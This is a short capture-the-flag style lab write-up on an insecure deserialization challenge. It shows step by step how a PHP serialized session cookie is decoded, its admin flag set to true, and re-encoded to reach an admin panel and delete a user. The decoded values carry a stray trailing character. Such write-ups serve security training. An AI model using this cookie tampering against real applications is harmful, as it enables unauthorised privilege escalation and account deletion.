## Modifying serialized objects

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /admin
- /login
- PHP Object in cookie

## Resume

1. Login with wiener:peter
2. Identify the PHP object in cookie
3. Decode cookie
4. Update PHP object to get admin
5. Access admin dashboard
6. Delete Carlos

## Solve

Login with `wiener:peter` and access `/my-account?id=wiener`, then check the cookies : 

`Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

The base64 decoded using [Cyberchef](https://gchq.github.io/CyberChef/) :

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}7`

Update the decoded cookie using : 

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}7`

Reencode the updated cookie in base64 and change it on your browser : 

`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO303`

We can now access the admin dashboard at `/admin` and delete the user **Carlos**